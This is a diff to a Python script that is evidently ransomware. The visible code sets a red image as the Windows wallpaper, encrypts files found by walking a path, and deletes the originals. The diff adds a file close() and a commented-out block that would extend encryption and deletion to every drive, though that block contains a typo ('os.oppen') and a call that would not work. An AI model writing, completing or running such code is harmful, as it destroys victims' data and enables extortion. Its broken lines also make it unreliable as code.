@@ -10,6 +10,7 @@ img_result = open('C:\\red.gif', 'wb')
 img_result.write(imgdata)
 
 ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\red.gif", 0)
+img_result.close()
 
 def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
     if not out_filename:
@@ -42,3 +43,17 @@ for filename in glob.iglob(startPath, recursive=True):
         print("Encrypting> " + filename)
         encrypt_file(key, filename)
         os.remove(filename)
+
+'''
+d = os.oppen("fsutil fsinfo drives").readlines().split()[1:]
+
+for drive in d:
+    for filename in glob.iglob(drive+"**", recursive=True):
+        if (os.path.isfile(filename)):
+            print("Encrypting> " + filename)
+            encrypt_file(key, filename)
+            os.remove(filename)
+'''
+
+
+
